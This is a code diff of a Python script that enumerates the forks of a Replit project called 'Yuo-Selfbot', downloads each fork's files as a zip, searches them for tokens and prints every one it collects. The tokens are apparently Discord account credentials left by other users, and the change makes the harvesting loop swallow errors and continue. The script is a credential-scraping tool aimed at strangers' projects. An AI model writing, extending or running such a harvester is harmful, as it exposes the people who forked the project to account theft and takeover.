@@ -1,3 +1,4 @@
+from secrets import token_bytes
 from resources import Design
 import asyncio
 from resources import ReplIt
@@ -9,15 +10,25 @@ async def main():
     id = await repl.get_id("/@MatheusTeles1/Yuo-Selfbot")
     urls, ids = await repl.get_forks(id)
     await aprint(len(urls))
+    full = []
+
+    for url, id in zip(urls, ids):
+        try:
+            await repl.get_zip(url, id)
+        except:
+            continue
+
+    for id in ids:
+        try:
+            tokens = await repl.search_zip(id)
+            full += tokens
+        except:
+            continue
+
+    for token in full:
+        await aprint(token)
 
 
-
-    await asyncio.gather(*(repl.get_zip(url, id) for url, id in zip(urls, ids)))
-    tokens = await asyncio.gather(*(repl.search_zip(id) for id in ids))
-
-    for lists in tokens:
-        for token in lists:
-            await aprint(token)
 
 
 
